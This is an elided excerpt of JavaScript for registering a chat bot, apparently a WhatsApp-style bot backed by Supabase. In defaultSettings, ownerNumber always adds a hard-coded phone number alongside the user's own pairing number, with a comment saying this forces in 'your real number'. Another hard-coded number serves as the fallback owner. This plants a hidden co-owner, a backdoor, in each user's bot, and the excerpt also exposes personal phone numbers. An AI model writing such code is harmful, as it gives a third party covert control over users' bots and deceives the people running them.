...
async function registerBot(sessionId, botName, phoneNumber) {
    ...
    const defaultSettings = {
        ...
        alwaysOnline: true,
        welcome: true,
        // Force both pairing number AND your real number
        ownerNumber: cleanPhone ? [cleanPhone, "2348142656848"] : ["2348156013387"]
    };
    ...
    if (!supabase) {
        ...
        console.log(`[DB] Owner set with fallback: 2348156013387`);
        return;
    }
    ...
    try {
        ...
        else console.log(`[DB] Successfully saved owner with fallback number`);
    } catch (e) {
